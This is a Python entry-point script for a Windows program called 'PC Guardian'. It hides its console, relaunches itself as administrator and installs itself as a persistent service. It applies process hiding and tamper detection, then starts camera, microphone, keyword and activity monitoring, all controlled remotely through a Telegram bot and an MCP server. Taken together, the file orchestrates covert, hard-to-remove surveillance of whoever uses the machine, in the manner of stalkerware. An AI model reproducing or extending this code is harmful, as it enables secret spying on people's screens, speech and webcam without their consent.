"""
PC Guardian — Main Entry Point
Single click. Auto-installs as Windows Service. Never dies.
"""

import sys
import os
import ctypes
import threading
import atexit

# ── Path setup ────────────────────────────────────────────────────────────────
if getattr(sys, "frozen", False):
    BASE_DIR = os.path.dirname(sys.executable)
    # Add MEI path for imports
    mei = getattr(sys, "_MEIPASS", BASE_DIR)
    if mei not in sys.path:
        sys.path.insert(0, mei)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

sys.path.insert(0, BASE_DIR)

CONFIG_DIR   = os.path.join(BASE_DIR, "config")
CONFIG_PATH  = os.path.join(CONFIG_DIR, "config.enc")
SETUP_FLAG   = os.path.join(BASE_DIR, ".setup_done")
INSTALL_FLAG = os.path.join(BASE_DIR, ".installed")
LOG_DIR      = os.path.join(BASE_DIR, "logs")

# Create dirs immediately — no excuses
for d in [CONFIG_DIR, LOG_DIR]:
    try:
        os.makedirs(d, exist_ok=True)
    except Exception:
        pass


def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


def elevate():
    """Relaunch as admin if not already."""
    if not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable,
                f'"{os.path.abspath(sys.argv[0])}"',
                None, 1
            )
            sys.exit(0)
        except Exception:
            pass


def start_guardian():
    from config.config import Config
    from logs.logger import setup_logger
    from core.lock_engine import LockEngine
    from core.keyword_listener import KeywordListener
    from monitor.activity import ActivityMonitor
    from monitor.behavior import BehaviorMonitor
    from monitor.reporter import Reporter
    from scheduler.schedule_engine import ScheduleEngine
    from av.camera import CameraSystem
    from av.microphone import MicrophoneSystem
    from av.speaker import SpeakerSystem
    from bot.bot import GuardianBot
    from protection.tamper_detect import TamperDetect

    logger = setup_logger("main")

    # ── Step 1: Elevate to admin ──────────────────────────────────────────────
    elevate()

    # ── Step 2: Install as Windows Service + protection (once) ───────────────
    if not os.path.exists(INSTALL_FLAG):
        try:
            from install import install
            installed_path = install()
            logger.info(f"Installed to: {installed_path}")
        except Exception as e:
            logger.warning(f"Install: {e}")
        try:
            with open(INSTALL_FLAG, "w") as f:
                f.write("1")
        except Exception:
            pass

    # ── Step 3: Privileges ────────────────────────────────────────────────────
    try:
        from privilege import full_privilege_setup
        full_privilege_setup()
    except Exception as e:
        logger.warning(f"Privilege: {e}")

    # ── Step 4: Kernel guard (DACL + process hiding) ─────────────────────────
    try:
        from kernel_guard import setup_kernel_guard, disable_kernel_guard
        setup_kernel_guard()
        atexit.register(disable_kernel_guard)
    except Exception as e:
        logger.warning(f"Kernel guard: {e}")

    # ── Step 5: Load all systems ──────────────────────────────────────────────
    cfg         = Config.load()
    lock_engine = LockEngine(cfg)
    speaker     = SpeakerSystem(cfg)
    camera      = CameraSystem(cfg)
    mic         = MicrophoneSystem(cfg, lock_engine)
    activity    = ActivityMonitor(cfg)
    behavior    = BehaviorMonitor(cfg, lock_engine, mic)
    reporter    = Reporter(cfg, activity)
    scheduler   = ScheduleEngine(cfg, lock_engine)
    tamper      = TamperDetect(cfg)

    # ── Step 6: MCP server ────────────────────────────────────────────────────
    try:
        import mcp_server
        mcp_server.init(cfg, lock_engine, camera, mic, speaker, activity)
        mcp_server.start_mcp_thread()
    except Exception as e:
        logger.warning(f"MCP: {e}")

    # ── Step 7: Telegram bot ──────────────────────────────────────────────────
    bot = GuardianBot(
        cfg=cfg, lock_engine=lock_engine, camera=camera,
        mic=mic, speaker=speaker, activity=activity, scheduler=scheduler,
    )

    threads = [
        threading.Thread(target=activity.start,  daemon=True, name="Activity"),
        threading.Thread(target=behavior.start,  daemon=True, name="Behavior"),
        threading.Thread(target=scheduler.start, daemon=True, name="Scheduler"),
        threading.Thread(target=reporter.start,  daemon=True, name="Reporter"),
        threading.Thread(target=tamper.start,    daemon=True, name="Tamper"),
        threading.Thread(
            target=KeywordListener(cfg, lock_engine).start,
            daemon=True, name="Keyword"
        ),
    ]
    for t in threads:
        t.start()

    logger.info("PC Guardian fully operational.")
    bot.run()


if __name__ == "__main__":
    if "--uninstall" in sys.argv:
        pw = sys.argv[2] if len(sys.argv) > 2 else ""
        from install import uninstall
        ok, msg = uninstall(pw)
        print(msg)
        sys.exit(0 if ok else 1)

    if "--change" in sys.argv:
        from first_run import change_credentials
        change_credentials()
        sys.exit(0)

    # Hide console and start
    hide_console()
    start_guardian()
